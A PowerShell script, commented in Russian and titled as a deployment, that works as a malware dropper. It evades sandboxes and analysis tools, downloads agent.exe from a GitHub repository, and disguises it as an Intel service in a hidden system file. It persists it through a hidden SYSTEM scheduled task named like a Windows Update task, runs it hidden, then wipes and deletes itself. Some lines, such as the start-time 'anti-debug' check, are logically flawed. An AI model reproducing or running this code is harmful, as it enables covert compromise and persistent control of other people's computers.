# ==============================================
# ПРОФЕССИОНАЛЬНЫЙ ДЕПЛОЙ
# ==============================================

# Анти-отладка
if ((Get-Process -Id $PID).StartTime -lt (Get-Date).AddMinutes(-5)) { exit }  # Если запущено в отладчике
if (Test-Path "HKLM:\SOFTWARE\Wine") { exit }  # Если под Linux/Wine

# Проверка на VM
$VMArtifacts = @("vmtoolsd","VBoxService","xenservice","procmon","wireshark","fiddler")
if (Get-Process $VMArtifacts -ErrorAction SilentlyContinue) { exit }

# Параметры с резервными путями
$RepoBase = "https://github.com/Elmar-Rafaelyevich/windows-installer"
$BinaryName = "IntelDALService.exe"

# Выбор пути установки
$PossiblePaths = @(
    "$env:ProgramFiles\Intel\Intel(R) Management Engine Components\DAL",
    "$env:ProgramFiles\Realtek\Audio\HDA",
    "$env:ProgramFiles\Common Files\microsoft shared\ink"
)

$InstallDir = $null
foreach ($Path in $PossiblePaths) {
    if (Test-Path $Path) {
        $InstallDir = $Path
        break
    }
}

if (-not $InstallDir) {
    $InstallDir = "$env:AppData\Microsoft\Windows\Caches"
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    attrib +h $InstallDir
}

$FullPath = "$InstallDir\$BinaryName"

# Скачивание с проверкой
$TempFile = "$env:TEMP\$([System.Guid]::NewGuid()).tmp"
try {
    # Пробуем BITS
    $BitsJob = Start-BitsTransfer -Source "$RepoBase/agent.exe" -Destination $TempFile -Priority Low -Asynchronous
    $Timeout = 30
    do {
        Start-Sleep -Seconds 2
        $Timeout -= 2
        $JobState = Get-BitsTransfer -JobId $BitsJob.JobId | Select-Object -ExpandProperty JobState
    } while ($JobState -eq 'Transferring' -and $Timeout -gt 0)
    
    if ($JobState -eq 'Transferred') {
        Complete-BitsTransfer -BitsJob $BitsJob
    } else {
        throw "BITS timeout"
    }
} catch {
    # Fallback на WebClient
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Microsoft BITS/7.8")
    $wc.DownloadFile("$RepoBase/agent.exe", $TempFile)
}

# Проверяем, что скачалось (не вирус тотал детект?)
if ((Get-Item $TempFile).Length -lt 100kb) { exit }  # Слишком маленький

# Копируем в целевую папку
Copy-Item $TempFile $FullPath -Force
Remove-Item $TempFile -Force

# Маскируем файл
Set-ItemProperty -Path $FullPath -Name Attributes -Value (Get-ItemProperty $FullPath).Attributes -Include "Hidden, System"

# Автозагрузка через планировщик (скрытая задача)
$TaskName = "Microsoft\Windows\WindowsUpdate\UpdateOrchestrator"
$TaskXML = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <UserId>S-1-5-18</UserId>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <AllowStartOnDemand>true</AllowStartOnDemand>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$FullPath</Command>
    </Exec>
  </Actions>
</Task>
"@

$TaskXML | Out-File "$env:TEMP\task.xml" -Encoding Unicode
schtasks /create /tn $TaskName /xml "$env:TEMP\task.xml" /f
Remove-Item "$env:TEMP\task.xml" -Force

# Запуск
Start-Process -FilePath $FullPath -WindowStyle Hidden

# Самоуничтожение с затиранием
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath -and (Test-Path $scriptPath)) {
    # Перезаписываем скрипт мусором перед удалением
    $fs = [System.IO.File]::OpenWrite($scriptPath)
    $fs.SetLength(0)
    $fs.Write((New-Object Byte[] 1024), 0, 1024)
    $fs.Close()
    Remove-Item $scriptPath -Force
}
